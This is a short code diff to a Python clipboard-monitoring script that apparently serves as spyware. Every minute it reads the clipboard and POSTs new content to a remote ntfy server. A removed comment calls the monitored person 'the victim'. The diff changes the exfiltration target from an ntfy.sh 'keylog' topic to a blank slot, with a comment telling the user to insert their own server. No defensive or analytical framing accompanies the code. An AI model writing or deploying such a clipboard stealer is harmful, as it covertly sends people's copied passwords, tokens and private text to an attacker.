@@ -1,4 +1,3 @@
-#this is good because it keeps track of the clipboard. if nothing new is generated it wont send to server mea ing if the victim doesn't copy anything new it wont send.
 import subprocess
 import sys
 import pyperclip
@@ -34,7 +33,7 @@ def main():
         while True:
             data = pyperclip.paste()
             if data and data != last_data:
-                response = requests.post('https://ntfy.sh/keylog', data=data)
+                response = requests.post('', data=data) #put your ntfy server in the parentheses
                 if response.status_code == 200:
                     last_data = data
             time.sleep(60)  # Change sleep duration to 60 seconds
